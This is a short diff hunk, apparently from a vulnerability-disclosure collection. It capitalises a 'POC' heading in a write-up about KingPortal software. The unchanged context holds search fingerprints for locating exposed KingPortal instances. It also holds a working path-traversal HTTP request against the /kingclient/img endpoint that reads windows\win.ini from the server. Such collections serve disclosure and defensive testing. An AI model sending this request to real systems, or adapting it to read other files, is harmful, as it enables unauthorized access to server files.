@@ -14,7 +14,7 @@ body="/public/javascripts/Common/Util/km_util.js"
 web.title="KingPortal"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
